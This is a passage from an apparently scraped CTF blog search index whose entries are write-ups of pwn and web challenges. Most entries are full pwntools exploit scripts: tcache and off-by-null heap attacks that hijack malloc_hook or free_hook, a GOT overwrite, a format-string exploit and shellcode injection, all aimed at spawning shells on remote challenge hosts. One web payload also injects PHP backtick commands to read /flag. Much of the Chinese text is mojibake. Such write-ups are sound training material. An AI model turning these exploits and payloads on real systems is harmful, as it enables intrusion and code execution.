add(0x40,b&amp;quot;ddd&amp;quot;) #3
add(0x40,b&amp;quot;\x07&amp;quot;*0x40) #4
delete(4)
show(4)
libc_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=libc_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
realloc=libc_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
sys_addr=libc_addr+libc.sym[b&amp;quot;system&amp;quot;]
one_gadget=[0x4f365,0x4f3c2,0x10a45c]
shell=libc_addr+one_gadget[2]

edit(4,b&amp;quot;\x00&amp;quot;*0x40)
delete(0)
delete(0)
add(0x40,p64(free_hook))
add(0x40,b&amp;quot;qqq&amp;quot;)
add(0x40,p64(sys_addr))
# add(0x40,p64(malloc_hook-0x8))
# add(0x40,b&amp;quot;qqq&amp;quot;)
# add(0x40,p64(shell)+p64(realloc+0x1))

gdb.attach(io)
pause()

io.sendlineafter(b&amp;quot;--&amp;gt;&amp;gt;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;number: \n&amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()

# 0x4f365 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f3c2 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a45c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681961229895.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">‰∏ÄÈÅìtcache structÈ¢òÁõÆ drunk Â§çÁé∞</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/fYqCaAJM-/"" data-c="
          &lt;p&gt;64‰Ωçtcachebin attack+off by nullÔºå‰øùÊä§ÂÖ®ÂºÄ&lt;br&gt;
Ê†áÂáÜËèúÂçïÔºåÊ≠§È¢ò‰∏ãÊ†áÂàÜÈÖçÊòØ‰ºòÂÖàÂç†ÊçÆÁ©∫Èó≤ÁöÑ‰∏ãÊ†áÔºå‰ªéÂ∞èÂà∞Â§ßÈ°∫Â∫èÂàÜÈÖçÔºåstrcpy‰ºöÂú®Êú´Â∞æÊ∑ªÂä†&lt;code&gt;\x00&lt;/code&gt;ÈÄ†Êàêoff by null&lt;br&gt;
Â§ßËá¥ÊÄùË∑ØÊòØunsortedbin leakÁÑ∂ÂêéÂä´ÊåÅmalloc_hookÊâìone_gadget&lt;br&gt;
ÂÖàÊîæexpÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29088)
# io=process(&amp;quot;./HITCON_2018_children_tcache&amp;quot;)
elf=ELF(&amp;quot;./HITCON_2018_children_tcache&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(n,c):
    io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Size:&amp;quot;,str(n))
    io.sendafter(b&amp;quot;Data:&amp;quot;,c)

def show(n):
    io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))

add(0x440,b&amp;quot;aaa&amp;quot;) #0
add(0x68,b&amp;quot;ccc&amp;quot;) #1
add(0x4f0,b&amp;quot;ddd&amp;quot;) #2
add(0x10,b&amp;quot;bbb&amp;quot;) #3

delete(0)
delete(1)

for i in range(8):
    add(0x68-i,b&amp;quot;a&amp;quot;*(0x68-i)) #Â∞ÜÈÄêÂ≠óËäÇÊõ¥ÊîπÁõ¥Âà∞ÊúÄÂêé1Â≠óËäÇ
    delete(0)  #‰∏ãÊ†áÁ©∫Èó≤Âç≥ÂèØÂèñ

add(0x68,cyclic(0x60)+p64(0x4c0)) #0
delete(2)

add(0x440,b&amp;quot;sss&amp;quot;) #1
show(0)

leak_addr=u64(io.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
libc_addr=leak_addr-0x60-0x3EBC40
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=libc_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
one_gadget=[0x4f2a5,0x4f302,0x10a2fc]
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
shell=one_gadget[1]+libc_addr

add(0x68,b&amp;quot;eee&amp;quot;) #2  0,2Â†ÜÂùóÈáçÂè†

delete(0) #main_arena-&amp;gt;0
delete(2) #main_arena-&amp;gt;2-&amp;gt;0    double free

# gdb.attach(io)
# pause()

add(0x68,p64(malloc_hook))
add(0x68,p64(malloc_hook))
add(0x68,p64(shell))

io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Size:&amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive() 

# 0x4f2a5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f302 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;È¶ñÂÖàÂàÜÈÖç4‰∏™Â†ÜÂùóÔºåidx‰∏∫0Âíå2ÁöÑÂ†ÜÂùóÂ§ß‰∫é0x410Ôºåchunk 3Èò≤Ê≠¢ÈáäÊîæÊó∂‰∏étop chunkÂêàÂπ∂&lt;br&gt;
‰ΩÜdeleteÂáΩÊï∞Â≠òÂú®Â≠óÁ¨¶Ê±°Êüì&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681575273596.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Â¶ÇÊûúÈúÄË¶ÅËøõË°åunlinkÊìç‰ΩúÂêàÂπ∂Ââç‰∏â‰∏™chunkÈúÄË¶ÅÂ∞Üchunk 2ÁöÑpresizeÊõ¥ÊîπÔºåËøôÈáåÈúÄË¶ÅÁî®Âà∞forÂæ™ÁéØÊØè‰∏ÄÂ≠óËäÇÊõ¥ÊîπÔºåÊúÄÂêéÂÜçadd‰øÆÊîπpresizeÂç≥ÂèØ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;for i in range(8):
    add(0x68-i,b&amp;quot;a&amp;quot;*(0x68-i)) 
    delete(0) 
add(0x68,cyclic(0x60)+p64(0x4c0)) 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681575981844.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
‰πãÂêéÂÜçÂàÜÈÖçÂ†ÜÂùóÔºåËøôÊ†∑‰∏çÂêå‰∏ãÊ†áÁöÑÂ†ÜÂùóÊåáÂêëÂêå‰∏ÄÂùóÂÜÖÂ≠òÁ©∫Èó¥ÔºåÂèØ‰ª•ÂÆûÁé∞tcachebin attackÔºåÊúÄÂêéÂä´ÊåÅmalloc_hookÊâìone_gadgetÂç≥ÂèØgetshellÔºåÔºàÂä´ÊåÅfree_hook‰πüË°å&lt;/p&gt;
">hitcon_2018_children_tcache wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/7VDd7Yhhb/"" data-c="
          &lt;p&gt;64‰Ωçtcachebin attack+off by null+chunk overlappingÔºå‰øùÊä§ÂÖ®ÂºÄ&lt;br&gt;
‰ΩÜÊòØÂ≠òÂú®mmapÂºÄËæü‰∫Ü‰∏ÄÊÆµrwxÊùÉÈôêÁöÑÁ©∫Èó¥Âπ∂Âú®Á®ãÂ∫è‰∏ÄÂºÄÂßãÊ≥ÑÈú≤Âá∫Êù•Ôºõ&lt;br&gt;
Ê≠§È¢òÊ†áÂáÜËèúÂçïÔºåÊ≤°ÊúâuafÊ≤°ÊúâÂ†ÜÊ∫¢Âá∫Ôºå‰ΩÜÊòØfillÂáΩÊï∞ÈáåÈù¢Â≠òÂú®off by null&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681452419757.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,27185)
# io=process(&amp;quot;./sctf_2019_easy_heap&amp;quot;)
elf=ELF(&amp;quot;./sctf_2019_easy_heap&amp;quot;)

def alloc(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def fill(n,c):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,c)

io.recvuntil(b&amp;quot;Mmap: &amp;quot;)
mmap=int(io.recv(12),16)
print(&amp;quot;mmap: &amp;quot;+hex(mmap))

alloc(0x420) #0

alloc(0x38) #1
alloc(0x28) #2
alloc(0x4f0) #3
alloc(0x10) #4

delete(0)
payload=cyclic(0x20)+p64(0x4a0)
fill(2,payload)

delete(3)
delete(1)
delete(2)

alloc(0x460) #0

# gdb.attach(io)
# pause()

alloc(0x520) #1
payload=cyclic(0x420)+p64(0)+p64(0x41)+p64(mmap)
fill(0,payload+b&amp;quot;\n&amp;quot;)

alloc(0x38) #2
alloc(0x38) #3

payload=asm(shellcraft.sh())
fill(3,payload+b&amp;quot;\n&amp;quot;)

fill(1,b&amp;quot;\x30\n&amp;quot;)
alloc(0x28) #5
alloc(0x28) #6
payload=p64(mmap)
fill(6,payload+b&amp;quot;\n&amp;quot;)

io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Size: &amp;quot;,b&amp;quot;1&amp;quot;)
print(&amp;quot;asd  &amp;quot;+hex(mmap))

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ËøôÈáåÊàë‰ª¨Áî≥ËØ∑5‰∏™chunkÔºåÊúÄÂêé‰∏Ä‰∏™chunkÁî≥ËØ∑Èò≤Ê≠¢ÂêéÁª≠ËøõË°åunlinkÊìç‰ΩúÊó∂ÂÄôÂêéÂêëchunk‰∏étop chunkÂêàÂπ∂Ôºõ&lt;br&gt;
chunk 0Âíåchunk 3Â§ßÂ∞èÂùáÂ§ß‰∫é0x410,Âê¶ÂàôÈáäÊîæÊó∂‰ºöË¢´ÊîæËøõtcachebinËÄå‰∏çÊòØ unsortedbin‰∏≠ÔºåÔºåÈ¶ñÂÖàÈáäÊîæchunk 0ÔºåÁÑ∂Âêé‰øÆÊîπchunk 3ÁöÑpresize‰ª•ÂáÜÂ§áunlinkÊìç‰ΩúÔºàÈÄöËøáfill chunk 2ÂÆûÁé∞ÔºåÊ∫¢Âá∫&lt;code&gt;\x00&lt;/code&gt;Â∞Ü&lt;code&gt;0x501&lt;/code&gt;‰øÆÊîπ‰∏∫&lt;code&gt;0x500&lt;/code&gt;ÔºåÊ≠§Êó∂ÈáäÊîæchunk 3 ÔºåÂèØ‰ª•ÁúãÂà∞0123ÈÉΩË¢´ÂêàÂπ∂&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681452969182.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;Ôºå&lt;br&gt;
ÁÑ∂ÂêéÈáäÊîæ1Ôºå2Â†ÜÂùó&lt;br&gt;
Ê≠§Êó∂Êàë‰ª¨ÂÜçÂàÜÈÖç‰∏§‰∏™Â†ÜÂùóÔºåÂàÜÂà´ÂåÖÂê´0Âíå1Ôºå2Âíå3Ôºå‰ª•ÂÆûÁé∞chunk overlappingÔºå&lt;br&gt;
Êé•‰∏ãÊù•Ôºå‰øÆÊîπ0Ôºå1Â†ÜÂùóÔºåÂ†ÜÂùó0Â∞ÜnextÊåáÈíà‰øÆÊîπ‰∏∫mmapÂú∞ÂùÄÔºåÂ†ÜÂùó1Â∞ÜnextÊåáÈíà‰Ωé‰ΩçÂ≠óËäÇ‰øÆÊîπ‰∏∫&lt;code&gt;\x30&lt;/code&gt;‰ΩøÂÖ∂ÊåáÂêëmalloc_hook;&lt;br&gt;
Êé•‰∏ãÊù•Â∞±ÊòØtcachebin attackËøáÁ®ã‰∫ÜÔºåÂàÜÈÖçÂ†ÜÂùóÂà∞ÊåáÂÆöÂÜÖÂ≠òÂú∞ÂùÄ‰∏äËøõË°åËØªÂÜôÔºåmmapÂú∞ÂùÄÂÜôÂÖ•shellcode,malloc_hook‰∏äÂÜôÂÖ•mmapÂú∞ÂùÄÔºõ&lt;br&gt;
ÊúÄÂêéÂá∫Âèëmalloc_hookÔºåÊâßË°åshellcodeÊù•getshell&lt;/p&gt;
">sctf2019_easy_heap wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/5-Lmbm_Ch/"" data-c="
          &lt;p&gt;64‰ΩçÂä´ÊåÅgotË°®(Ê≥®ÊÑèÊèêÂâçÊõ¥Êç¢libcÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681139324722.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Á¨¨‰∏ÄÊ¨°ËæìÂÖ•Ë¥üÊï∞ÁªïËøáÈïøÂ∫¶Ê£ÄÊü•Âπ∂‰∏îÂèØ‰ª•ÂèçÂêëÊ∫¢Âá∫Âà∞bssÊÆµÂâçÁöÑgotË°®ÔºåÁî±Ê≠§Á¨¨‰∫åÊ¨°ËæìÂÖ•ÂèØ‰ª•Âä´ÊåÅgotË°®ÂÜÖÂÆπ&lt;br&gt;
Âä´ÊåÅexit()‰∏∫_startÔºåÁî±Ê≠§ÂèØ‰ª•ËøîÂõûÂÜçÊ¨°ËæìÂÖ•&lt;br&gt;
Êé•‰∏ãÊù•Ê≥ÑÈú≤libcÔºåÊ≥®ÊÑèÂú∞ÂùÄÂæóÂØπÈΩêÔºåÂõ†‰∏∫ÂÜÖÂ≠òÂÆûÈôÖÂú∞ÂùÄÂè™ÊúâÊú´‰∏â‰ΩçÂõ∫ÂÆöÔºåÂàôÈÄâÊã©Ê≥ÑÈú≤ÁöÑgotË°®ÂÅèÁßªÊú´Â∞æ‰∏∫0ÁöÑÂá†È°πÈÉΩË°åÔºå‰∏∫8ÁöÑ‰∏çË°åÔºåÊ≥®ÊÑèÂèëÈÄÅÊó∂ÊèêÂâçgdbË∞ÉËØïËé∑Âèñ‰∏Ä‰∏ãÂÆûÈôÖÂú∞ÂùÄÊú´Â∞æ2‰ΩçÂÜçÂèëÈÄÅÔºåÈÅøÂÖçËæìÂÖ•‰øÆÊîπÂÆûÈôÖÂú∞ÂùÄ&lt;br&gt;
Ê≥ÑÈú≤libcÂêéÂÜçÊ¨°ËøîÂõûÂºÄÂ§¥ÔºåÂä´ÊåÅputsÁöÑgotË°®Âú∞ÂùÄ‰∏∫systemÂáΩÊï∞Âú∞ÂùÄÔºåÂ∞Üputs_got-0x8Ë¶ÜÁõñ‰∏∫&lt;code&gt;/bin/sh\x00&lt;/code&gt;,ÊâÄ‰ª•ËæìÂÖ•-9Â∞ÜËæìÂÖ•ÊµÅÂÆö‰ΩçÂà∞ÂÅèÁßª0x404010Â§ÑÔºåÂç≥puts_got-0x8Â§ÑÔºåÊñπ‰æø‰∏ÄÊ¨°ÊÄßËØªÂÖ•ÁÑ∂Âêégetshell&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./vuln&amp;quot;)
io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28201)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

start_addr=elf.sym[b&amp;quot;_start&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]

io.sendlineafter(b&amp;quot;one.\n&amp;quot;,b&amp;quot;-6&amp;quot;)
io.recvuntil(b&amp;quot;name\n&amp;quot;)
payload=p64(start_addr)

# gdb.attach(io)
# pause()

io.sendline(payload)


io.sendlineafter(b&amp;quot;one.\n&amp;quot;,b&amp;quot;-8&amp;quot;)
io.recvuntil(b&amp;quot;name\n&amp;quot;)
payload=b&amp;quot;\xd0&amp;quot;
io.send(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;setbuf&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

io.sendlineafter(b&amp;quot;one.\n&amp;quot;,b&amp;quot;-9&amp;quot;)
io.recvuntil(b&amp;quot;name\n&amp;quot;)
payload=b&amp;quot;/bin/sh\x00&amp;quot;+p64(sys_addr)
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HGAME 2023 week1]choose_the_seat wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/a8Nkgfp0x/"" data-c="
          &lt;p&gt;Ê≠§È¢ò64‰ΩçÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤Âä´ÊåÅgotË°®Âç≥ÂèØÔºåÊ≥®ÊÑèÊé•Êî∂Âíå‰º†ÂèÇÔºåone_gagdetË≤å‰ººÊâì‰∏çÈÄö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681118319987.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])



# io=process(&amp;quot;./OilSpill&amp;quot;)
io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28755)
elf=ELF(&amp;quot;./OilSpill&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)

pop_rdi_ret=0x4007e3
ret=0x400536
x=0x600C80
puts_got=elf.got[b&amp;quot;puts&amp;quot;]

libc_addr=int(io.recvuntil(b&amp;quot;, &amp;quot;)[:-2],16)-libc.sym[b&amp;quot;puts&amp;quot;]
printf_addr=int(io.recvuntil(b&amp;quot;, &amp;quot;)[:-2],16)
stack_addr=int(io.recvuntil(b&amp;quot;, &amp;quot;)[:-2],16)
# temp=int(io.recvuntil(b&amp;quot;, &amp;quot;)[:-2],16)
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
print(&amp;quot;printf_addr: &amp;quot;+hex(printf_addr))

# gdb.attach(io)
# pause()


str_bin_sh=libc_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=libc_addr+libc.sym[b&amp;quot;system&amp;quot;]
# one_gadget=[0x4f2a5,0x4f302,0x10a2fc]
# shell=one_gadget[1]+libc_addr


io.recvuntil(b&amp;quot;clean it?\n&amp;quot;)
payload=fmtstr_payload(8,{puts_got:sys_addr,x:b&amp;quot;/bin/sh\x00&amp;quot;})
io.sendline(payload)
io.interactive()

# 0x4f2a5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f302 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

# Gadgets information
# ============================================================
# 0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004007e0 : pop r14 ; pop r15 ; ret
# 0x00000000004007e2 : pop r15 ; ret
# 0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004005f8 : pop rbp ; ret
# 0x00000000004007e3 : pop rdi ; ret
# 0x00000000004007e1 : pop rsi ; pop r15 ; ret
# 0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400536 : ret
# 0x00000000004006cb : ret 0x8b48

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
">[SDCTF 2022]Oil Spill wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/h-MuOCtcb/"" data-c="
          &lt;p&gt;Èòü‰ºçÔºöüòçüíµüéÉüéÉü§£ü§£üòÜüòÅüòÅüòáüò°üéÉüòÜüíµ‚ò∫üòáüòÜüòäüòÅüòÜüòÅ&lt;/p&gt;
&lt;h2 id=&#34;misc&#34;&gt;MISC:&lt;/h2&gt;
&lt;h3 id=&#34;Á≠æÂà∞&#34;&gt;Á≠æÂà∞:&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016707539.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;base32 Ëß£Âæó&lt;/p&gt;
&lt;p&gt;flag{2dfea6c861edabefab189caf42250b20}&lt;br&gt;
&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h2 id=&#34;pwn&#34;&gt;PWN:&lt;/h2&gt;
&lt;h3 id=&#34;ËØ∑ÂØπ‰ªñ‰ΩøÁî®shellcodeÂêß&#34;&gt;ËØ∑ÂØπ‰ªñ‰ΩøÁî®shellcodeÂêßÔºö&lt;/h3&gt;
&lt;p&gt;‰∏ªÂáΩÊï∞mmapÂºÄËæü‰∏ÄÊÆµÂèØÂÜôÂå∫ÂüüÔºåËæìÂÖ•ÂæÄÂÖ∂‰∏≠Â°´ÂÖ•shellcodeÔºå‰ΩÜÊòØlookatmeÂáΩÊï∞ÊúâÈôêÂà∂&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681013489240.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ËøôÈáåÈÄâÊã©ÁªïËøástrlen&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681013623713.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÊâÄ‰ª•Âè™ÈúÄÂ∞ÜeaxÂØÑÂ≠òÂô®Ëµã0Âç≥ÂèØ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./pwnme&amp;quot;)
# io=remote(&amp;quot;101.43.190.199&amp;quot;,28003)
elf=ELF(&amp;quot;./pwnme&amp;quot;)

io.recvuntil(b&amp;quot;&amp;gt;&amp;gt;&amp;gt;&amp;quot;)
payload=asm(&#39;mov eax,0x0&#39;)+asm(shellcraft.sh())
gdb.attach(io)
pause()

io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h2 id=&#34;web&#34;&gt;WEB:&lt;/h2&gt;
&lt;h3 id=&#34;web-Á≠æÂà∞1&#34;&gt;web-Á≠æÂà∞1:&lt;/h3&gt;
&lt;p&gt;ctfer1Âíå2ÂèÇÊï∞‰ΩøÁî®Âº∫Á¢∞Êíû&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ctfer1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;amp;ctfer2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ctfer3‰ΩøÁî®%00Êà™Êñ≠ÁªïËøá&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; &amp;amp;ctfer3=115%00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ctfer4‰ΩøÁî®ÊãºÊé•ÁªïËøá&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;ctfer4=?&amp;gt;&amp;lt;?=`ls /`;
&amp;gt;
&amp;gt;ctfer4=?&amp;gt;&amp;lt;?=`cat /flag`;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;POC:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST http://101.43.190.199:28005/ HTTP/1.1
 Host: 101.43.190.199:28005
 Content-Length: 358
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 Origin: http://101.43.190.199:28005
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Referer: http://101.43.190.199:28005/
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Connection: close


ctfer1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;amp;ctfer2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;amp;ctfer3=115%00&amp;amp;ctfer4=?&amp;gt;&amp;lt;?=`cat /flag`;
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016151223.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;web-È≠îÊñπ&#34;&gt;web-È≠îÊñπ:&lt;/h3&gt;
&lt;p&gt;‰∏Ä.jsÂÆ°ËÆ°&lt;/p&gt;
&lt;p&gt;Ê†πÊçÆ‰ª•ÂæÄÁöÑÂÅöÈ¢òÁªèÈ™åÔºåÊúÄÂêéÂá∫flagÁöÑÊó∂ÂÄôÂæÄÂæÄ‰ºöÊúâÂºπÁ™óÔºå‰∫éÊòØÁõ¥Êé•ÊêúalertÂ∞±ÂèØ‰ª•Ê¢≠Âìà&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681016252496.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
